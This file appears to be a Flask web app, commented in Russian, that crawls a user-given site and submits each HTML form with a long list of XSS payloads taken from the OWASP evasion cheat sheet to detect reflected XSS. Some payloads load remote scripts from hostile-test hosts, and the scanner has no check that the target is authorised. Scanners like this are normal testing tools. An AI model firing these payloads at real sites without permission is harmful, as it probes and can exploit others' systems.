import os
import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse
from flask import Flask, render_template, request
from flask_wtf import FlaskForm
from wtforms import StringField, SelectField, SubmitField
from wtforms.validators import URL, DataRequired


# Переменные для работы фреймворка Flask
app = Flask(__name__)
SECRET_KEY = os.urandom(32)
app.config['SECRET_KEY'] = SECRET_KEY


# Глобальные множества для работы с ссылками
internal_urls = set()
external_urls = set()
counter_urls = 0


# Функция, проверяющая корректность ссылки
def is_valid(url):
    parsed = urlparse(url)
    return bool(parsed.netloc) and bool(parsed.scheme)


# Функция, добавляющая ссылки в карту сайта
def get_links(url):
    urls = set()
    domain_name = urlparse(url).netloc

    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
    }
    page_content = requests.get(url, headers=headers).content
    soup = BeautifulSoup(page_content, "lxml")

    for tag in soup.findAll("a"):
        href = tag.attrs.get("href")
        if href == "" or href is None:
            continue
        href = urljoin(url, href)
        parsed_href = urlparse(href)

        href = parsed_href.scheme + "://" + parsed_href.netloc + parsed_href.path
        if not is_valid(href):
            continue
        if href in internal_urls:
            continue
        if domain_name not in href or (parsed_href.scheme + "://" + domain_name not in href):
            if href not in external_urls:
                external_urls.add(href)
            continue
        urls.add(href)
        internal_urls.add(href)
    return urls


# Функция, составляющая карту сайта (получение всех ссылок)
def get_sitemap(url, max_urls=50):
    global counter_urls
    counter_urls += 1
    links = get_links(url)
    for link in links:
        if counter_urls > max_urls:
            break
        get_sitemap(link, max_urls=max_urls)


# Функция, которая возвращает список всех HTML-форм с указанной страницы
def get_forms(url):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
    }
    page_content = requests.get(url, headers=headers).content
    soup = BeautifulSoup(page_content, "lxml")
    return soup.find_all("form")


# Функция, которая возвращает информацию о переданной форме
def get_form_info(form):
    info = dict()
    action = form.attrs.get("action").lower()
    method = form.attrs.get("method", "get").lower()
    inputs = []
    for input_field in form.find_all("input"):
        input_type = input_field.attrs.get("type", "text")
        input_name = input_field.attrs.get("name")
        inputs.append({"type": input_type, "name": input_name})

    info["action"] = action
    info["method"] = method
    info["inputs"] = inputs
    return info


# Функция для отправки формы
def submit_form(form_info, url, value):
    target_url = urljoin(url, form_info["action"])
    inputs = form_info["inputs"]
    data = dict()
    for item in inputs:
        if item["type"] == "text" or item["type"] == "search":
            item["value"] = value
        input_name = item.get("name")
        input_value = item.get("value")
        if input_name and input_value:
            data[input_name] = input_value

    if form_info["method"] == "post":
        return requests.post(target_url, data=data)
    else:
        return requests.get(target_url, params=data)


# Функция Reflected XSS сканирования переданного сайта
def scan_reflected_xss(url):
    global internal_urls, external_urls
    internal_urls = set()
    external_urls = set()
    is_vulnerable = False
    forms = get_forms(url)
    print(f"[+] {url}: Detected {len(forms)} forms")
    # https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html
    js_scripts = ["<script>alert('xss')</script>", '"><script>alert("xss")</script>', """<BR SIZE="&{alert('XSS')}">""", """<LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css">""", """<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>""",
        '"%3cscript%3ealert(document.cookie)%3c/script%3e', '<scr<script>ipt>alert(document.cookie)</script>', '<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>', """<IMG SRC="javascript:alert('XSS');">""", '<iframe src=http://xss.rocks/scriptlet.html <',
        "<IMG SRC=javascript:alert('XSS')>", "<IMG SRC=JaVaScRiPt:alert('XSS')>", "<IMG SRC=javascript:alert(&quot;XSS&quot;)>", """<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>""", '\<a onmouseover="alert(document.cookie)"\>xxs link\</a\>',
        '<IMG """><SCRIPT>alert("XSS")</SCRIPT>"\>', '<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>', """javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>""",
        """<IMG SRC=# onmouseover="alert('xxs')">""", """<IMG SRC= onmouseover="alert('xxs')">""", """<IMG onmouseover="alert('xxs')">""", '<IMG SRC=/ onerror="alert(String.fromCharCode(88,83,83))"></img>', """<BODY BACKGROUND="javascript:alert('XSS')">""",
        """<img src=x onerror="&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041">""",
        '<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>', '<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>',
        '<IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041>', """<? echo('<SCR)'; echo('IPT>alert("XSS")</SCRIPT>'); ?>"""
        """<IMG SRC="jav ascript:alert('XSS');">""", """<IMG SRC="jav&#x09;ascript:alert('XSS');">""", """<IMG SRC="jav&#x0A;ascript:alert('XSS');">""", """<IMG SRC="jav&#x0D;ascript:alert('XSS');">""", """perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out""",
        """<IMG SRC=" &#14; javascript:alert('XSS');">""", '<<SCRIPT>alert("XSS");//\<</SCRIPT>', '<SCRIPT SRC=http://xss.rocks/xss.js?< B >', '<SCRIPT SRC=//xss.rocks/.j>', """<IMG LOWSRC="javascript:alert('XSS')">""", '</TITLE><SCRIPT>alert("XSS");</SCRIPT>',
        "<BODY ONLOAD=alert('XSS')>", "<svg/onload=alert('XSS')>", """<IMG SRC='vbscript:msgbox("XSS")'>""", """<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</br>""", """<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">""",
        """<META HTTP-EQUIV="Link" ent="<http://ha.ckers.org/xss.css>; REL=stylesheet">""", """<TABLE><TD BACKGROUND="javascript:alert('XSS')">""", """<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>"""]
    for form in forms:
        form_details = get_form_info(form)
        for script in js_scripts:
            content = submit_form(form_details, url, script).content.decode()
            if script in content:
                print(f"\t[*] XSS Detected by {script}")
                print(f"\t[*] Form details:")
                print(form_details)
                is_vulnerable = True
    return is_vulnerable


# Класс, отвечающий за работу с формой
class ScanForm(FlaskForm):
    url = StringField("Введите адрес: ", validators=[DataRequired(), URL(message='Must be a valid URL')])
    scan_type = SelectField(u"Тип сканирования: ", validators=[DataRequired()],
                            choices=[('1', 'Reflected XSS'), ('2', 'Stored XSS'), ('3', 'Dom-based XSS'), ('4', 'Full Scan')])
    submit = SubmitField("Отправить")


# Функция представления корневого адреса
@app.route('/', methods=['GET', 'POST'])
def main_page():
    url = None
    scan_type = None
    form = ScanForm()
    if form.validate_on_submit():
        url = form.url.data
        scan_type = form.scan_type.data
    form.url.data = ''
    form.scan_type.data = ''
    return render_template('index.html', form=form, url=url, scan_type=scan_type)


# Функция представления адреса сканирования
@app.route('/scan', methods=['GET', 'POST'])
def scan_page():
    if request.method == 'POST':
        url = request.form.get('url')
        internal_urls.add(url)
        scan_type = request.form.get('scan_type')
    get_sitemap(url)
    return render_template('scan.html', scan_reflected_xss=scan_reflected_xss, internal_urls=internal_urls,
                          external_urls=external_urls, url=url, scan_type=scan_type)


@app.route('/about', methods=['GET', 'POST'])
def about_page():
    return render_template('about.html')


if __name__ == '__main__':
    """
        Алгоритм работы приложения
        1. Ввод данных пользователем
            1.1. Ввод адреса для проведения сканирования
            1.2. Выбор типа уязвимости (coming soon)
        2. Создание карты сайта
        3. Последовательный проход по ссылкам карты
            3.1. Поиск Reflected XSS
                3.1.1. Поиск форм
                3.1.2. Отправка форм
                3.1.3. Определение опасности
            3.2. Поиск Stored XSS
                *coming soon
            3.3. Поиск DOM-based XSS
                *coming soon
        4. Подготовка и формирование отчёта
        5. Вывод отчёта и итоговых рекомендаций
    """
    app.run()
